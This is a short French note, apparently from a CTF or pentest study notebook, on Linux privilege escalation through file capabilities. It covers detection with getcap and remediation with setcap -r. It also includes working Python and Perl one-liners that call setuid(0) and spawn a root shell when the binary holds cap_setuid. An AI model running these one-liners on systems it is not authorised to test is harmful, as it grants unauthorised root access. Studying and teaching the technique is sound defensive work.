---
technique: "Linux Capabilities"
os: Linux
categorie: PrivEsc
tags: [technique, privesc, linux, capabilities]
rooms: []
---

# Linux Capabilities

## Principe
> Les **capabilities** découpent les super-pouvoirs de root en petits morceaux assignables à un binaire précis. La capability dangereuse `cap_setuid+ep` autorise un binaire à **changer son UID vers 0 (root)**. Si un binaire capable d'exécuter du code (Python, Perl, Vim…) l'a, on devient root.

## Le piège
> Ce **n'est pas un SUID** : `ls -l` montre des droits normaux (`-rwxr-xr-x`, pas de `s`). Une recherche de SUID (`find -perm -4000`) **ne le détecte pas**. Il faut une recherche dédiée.

## Détection
```bash
getcap -r / 2>/dev/null
# chercher cap_setuid+ep dans la sortie
```

## Exploitation (via GTFOBins, section "Capabilities")
```bash
# python avec cap_setuid
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# perl
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## Remédiation
- Retirer les capabilities inutiles : `setcap -r /chemin/binaire`.

## Lien
- Technique sœur : SUID-Binaries (même objectif, mécanisme différent).
